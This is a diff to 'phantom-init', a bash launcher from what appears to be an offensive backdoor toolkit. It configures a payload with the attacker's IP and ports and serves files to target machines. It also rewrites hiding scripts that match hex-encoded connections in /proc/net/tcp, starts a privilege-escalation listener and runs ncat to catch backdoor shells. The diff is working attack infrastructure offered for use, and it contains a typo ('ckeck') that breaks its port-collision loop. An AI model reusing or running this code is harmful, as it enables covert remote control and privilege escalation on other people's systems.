@@ -27,14 +27,13 @@ SOFTWARE.
 '
 
 #check the number of arguments given
-if [ $# -ne 4 ]; then
-cat << EOF
-Syntax: phantom-init  [ip=][port1=][port2=][portp=]
+if [ $# -ne 3 ]; then
+  cat << EOF
+Syntax: phantom-init [ip=][port1=][port2=]
 
 ip:    the attacker's ip (e.g. ip=127.0.0.1)
 port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
 port2: the port that listens for the backdoor shells after delivering the payload
-portp: the port that the python server listens to transfer the functions and variables needed by the payload
 EOF
   exit
 fi
@@ -47,23 +46,45 @@ for i in $@; do
     port1=${i#*=}
   elif [ "$(expr $i : port2)" != "0" ]; then
     port2=${i#*=}
-  elif [ "$(expr $i : portp)" != "0" ]; then
-    portp=${i#*=}
+  #elif [ "$(expr $i : portp)" != "0" ]; then
+  #  portp=${i#*=}
   fi
 done
 
-#find the script path
+#find the script's path
 path=$(dirname $0)
 
-#replace ip, port2 and portp in payload
+#initialize portp and portr (15000-16000)
+portp=$((15000 + $((RANDOM % 1000))))
+portr=$((15000 + $((RANDOM % 1000))))
+listening_port_list=$(netstat -tpnl 2>/dev/null | awk '{ print $4 }' | awk -F: '{ print $2 }')
+while true; do
+  check=1
+  phantom_port_list=($portp $portr)
+  for i in $listening_port_list; do
+    for j in $phantom_port_list; do
+      if [ $i == $j ]; then
+        portp=$((15000 + $((RANDOM % 1000))))
+        portr=$((15000 + $((RANDOM % 1000))))
+        ckeck=0
+      fi
+    done
+  done
+  if [ $check == "1" ]; then
+    break
+  fi
+done
+
+#replace ip, port2, portp and portr in payload
 sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/payload
-sed -i "s%port=\".*\"%port=\"$port2\"%" $path/payload
+sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/payload
 sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/payload
+sed -i "s%portr=\".*\"%portr=\"$portr\"%" $path/payload
 
 #replace portp in python_server
 sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/python_server
 
-#--replace the ip and port in hiding_script--
+#--replace the ip and port in usb_bus_script--
 #convert the ip to hex
 IFS='.' read -r -a ip_dec <<<$ip
 ip_hex=()
@@ -85,7 +106,7 @@ hex_port=$(printf "%x" $port2)
 #convert all letters to upper (needed for /proc/net/tcp)
 hex_port=$(echo $hex_port | tr [:lower:] [:upper:])
 #replace the ip:port in services
-sed -i "s%~ /.*:.*/%~ /$hex_ip:$hex_port/%" $path/payload
+sed -i "s%~ /.*:.*/%~ /$hex_ip:$hex_port/%" $path/misc/services
 
 #replace the ip and port in phantom-firewall
 sed -i "s%~ /.*:.*/%~ /$ip:$port2/%" $path/phantom-firewall
@@ -93,6 +114,14 @@ sed -i "s%~ /.*:.*/%~ /$ip:$port2/%" $path/phantom-firewall
 #start the server that is gonna transfer the files needed by the payload to the target machine
 fuser -k $portp/tcp &>/dev/null
 $path/python_server &
+
+#replace ip, port2 and portp in priv_esc_payload
+sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/priv_esc_payload
+sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/priv_esc_payload
+sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/priv_esc_payload
+
+#start the script that will accept connections after priviledge escalation
+$path/priv_esc_init portr=$portr path=$path &
 
 #start ncat and invoke the phantom script when a connection occurs
 while true; do
